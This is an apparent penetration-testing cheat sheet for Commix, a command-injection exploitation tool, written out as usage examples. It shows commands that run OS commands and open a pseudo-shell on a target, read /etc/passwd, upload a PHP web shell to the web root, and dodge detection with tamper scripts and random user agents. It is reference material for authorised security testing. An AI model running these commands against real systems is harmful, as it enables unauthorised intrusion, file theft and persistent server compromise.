# Commix

**Tags:** `#commix` `#commandinjection` `#rce` `#webappsec` `#web`

Automated command injection exploitation tool. Tests web parameters for OS command injection vulnerabilities and provides an interactive shell or executes commands if found. Supports GET/POST, cookies, headers, JSON, XML, and multiple injection techniques including classic, time-based blind, and file-based.

**Source:** https://github.com/commixproject/commix
**Install:** Pre-installed on Kali — `sudo apt install commix`

```bash
commix --url="http://target.com/page?param=value"
```

> [!note]
> Commix tests multiple injection techniques automatically. If you already know the vulnerable parameter, use `--param` to target it directly. Use `--os-cmd` for a single command or `--os-shell` for an interactive pseudo-terminal. Use `*` in the URL/data to mark the injection point explicitly.

---

## Basic Usage

```bash
# Test all GET params
commix --url="http://target.com/ping?ip=127.0.0.1"

# Specify vulnerable parameter
commix --url="http://target.com/ping?ip=127.0.0.1" --param="ip"

# POST request
commix --url="http://target.com/ping" --data="ip=127.0.0.1"

# Execute single command
commix --url="http://target.com/ping?ip=127.0.0.1" --os-cmd="id"

# Drop to interactive pseudo-terminal
commix --url="http://target.com/ping?ip=127.0.0.1" --os-shell
```

---

## Authentication & Session

```bash
# Cookie
commix --url="http://target.com/page?id=1" \
  --cookie="PHPSESSID=abc123; role=admin"

# HTTP Basic auth
commix --url="http://target.com/page" \
  --auth-type=basic --auth-cred="admin:password"

# Custom headers
commix --url="http://target.com/page" \
  --headers="Authorization: Bearer token\nX-Custom: value"
```

---

## Request Formats

```bash
# From Burp saved request file
commix --request=/tmp/request.txt

# JSON body
commix --url="http://target.com/api" \
  --data='{"ip":"127.0.0.1"}' \
  --headers="Content-Type: application/json"

# Custom injection marker (* = injection point)
commix --url="http://target.com/ping?ip=127.0.0.1*"
commix --url="http://target.com/ping" --data="ip=127.0.0.1*"
```

---

## Technique Selection

```bash
# Force specific technique
commix --url="..." --technique=C   # classic (;, |, &&)
commix --url="..." --technique=T   # time-based blind
commix --url="..." --technique=F   # file-based

# Skip technique
commix --url="..." --skip-technique=F
```

---

## File Operations

```bash
# Read file from server
commix --url="http://target.com/ping?ip=127.0.0.1" --file-read="/etc/passwd"

# Write file to server
commix --url="http://target.com/ping?ip=127.0.0.1" \
  --file-write="./shell.php" \
  --file-dest="/var/www/html/shell.php"
```

---

## Evasion

```bash
# Through Burp proxy
commix --url="..." --proxy="http://127.0.0.1:8080"

# Tamper scripts
commix --url="..." --tamper=space2ifs
commix --url="..." --tamper=space2tab

# Random user agent
commix --url="..." --random-agent

# Delay between requests
commix --url="..." --delay=2
```

---

## Key Flags

| Flag | Description |
|------|-------------|
| `--url` | Target URL |
| `--data` | POST data |
| `--param` | Specific parameter to test |
| `--cookie` | Cookie string |
| `--headers` | Custom headers |
| `--os-cmd` | Execute single OS command |
| `--os-shell` | Interactive pseudo-terminal |
| `--technique` | C=classic, T=time-based, F=file-based |
| `--file-read` | Read remote file |
| `--file-write` | Local file to write |
| `--file-dest` | Remote destination path |
| `--proxy` | HTTP proxy |
| `--tamper` | Evasion tamper script |
| `--random-agent` | Random User-Agent |
| `--delay` | Delay between requests (sec) |
| `--level` | Test depth 1-3 (default 1) |
| `--request` | Load request from file |

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
